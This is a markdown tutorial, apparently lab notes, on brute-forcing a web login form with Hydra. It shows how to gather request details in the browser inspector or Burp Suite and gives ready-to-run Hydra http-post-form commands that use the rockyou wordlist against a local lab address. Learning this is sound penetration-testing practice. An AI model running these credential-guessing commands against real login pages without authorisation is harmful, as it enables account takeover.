# Login Web Brute Force Attack.
## Hydra.
Hydra is a popular open-source password cracking tool that can be used to perform brute-force attacks on login credentials of various network protocols, including FTP, HTTP, SSH, Telnet, and others. It uses different attack methods, including dictionary attacks, brute-force attacks, and hybrid attacks, to guess passwords and gain unauthorized access to a system.
<p align="center">
  <img src="https://github.com/user-attachments/assets/51401d1e-48df-4dc2-a807-a33dfb52212a" width="500">
</p>

-----------------------
  
### What do we need to perform this type of Hydra Brute Force Attack?
#### Inspector.
We can obtain all the information to deploy the attack in the inspector: 
1. User & Password Files. 
3. Target Login Panel URL.
4. Request Method.<br />
<br />

> Post Request Method=`http-post-form` 
<p align="center">
  <img src="https://github.com/user-attachments/assets/058e721a-f05f-4786-8d12-3dd1ce89b341" width="700">
</p>


5. Request Body. 



<p align="center">
  <img src="https://github.com/user-attachments/assets/84fd8069-a861-41fd-aa6c-943832e79d2c">
</p>

6. Cookies (If needed).

<p align="center">
  <img src="https://github.com/user-attachments/assets/ee274e2d-69e3-44be-b719-b66d04512c67" width="500">
</p>
  
8. Response (Login Error Message).

<p align="center">
  <img src="https://github.com/user-attachments/assets/0cb1dce5-3641-4376-970d-6751bea3ed93" width="700">
</p>

#### Burpsuite.
We can obtain all this info checking Burpsuite.
<p align="center">
  <img src="https://github.com/user-attachments/assets/59762f83-b729-43cd-af16-42933a120498" width="700">
</p>


-------------

### Hydra Web Brute Force Attack.

- In my case, the unmodified request looks like `username=<user>&password=<pass>`.
If we need need to replace "user" and "password", we will replace them with `^USER^` and `^PASS^`. But in case we know one of them, we don't need to add it.
<br />

- We have to add `H=` before the cookies and we can add `F=` before the Loging Error Message.

`hydra -L <userFile> -P <passwordFile> <RHOST> <requestMethod> "<URL>:<requestBody>:H=<COOKIES>:F=<ErrorResponse>"`

<br />

`hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.17.0.2 http-post-form "/index.php:username=^USER^&password=^PASS^:H=Cookie: PHPSESSID=t2d0hebr4qjb42n2fc5daam94d:F=Credenciales incorrectas."`

<p align="center">
  <img src="https://github.com/user-attachments/assets/98774913-28e2-4c0f-9bf8-e2ac67eae466" width="2000">
</p>

If the IP itself takes us directly to the login panel, we can simply use the "/" to specify the URL, and it would look like:
`hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.17.0.2 http-post-form "/:username=^USER^&password=^PASS^:H=Cookie: PHPSESSID=t2d0hebr4qjb42n2fc5daam94d:F=Credenciales incorrectas."`


















